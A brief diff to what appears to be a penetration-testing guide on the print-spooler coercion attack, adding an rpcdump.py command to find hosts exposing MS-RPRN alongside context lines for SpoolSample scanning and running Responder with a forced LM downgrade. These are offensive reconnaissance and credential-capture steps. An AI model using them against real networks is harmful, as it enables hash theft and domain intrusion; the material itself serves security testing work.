@@ -24,6 +24,10 @@ Using a slightly modified @mysmartlogin's (Vincent Le Toux's) SpoolerScanner, se
 
     ForEach ($server in Get-Content servers.txt) {Get-SpoolSample $server}
 
+You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
+
+    rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
+
 ### Start Responder with the --lm flag to force a LM downgrade
 
     ./Responder.py -I eth0 --lm
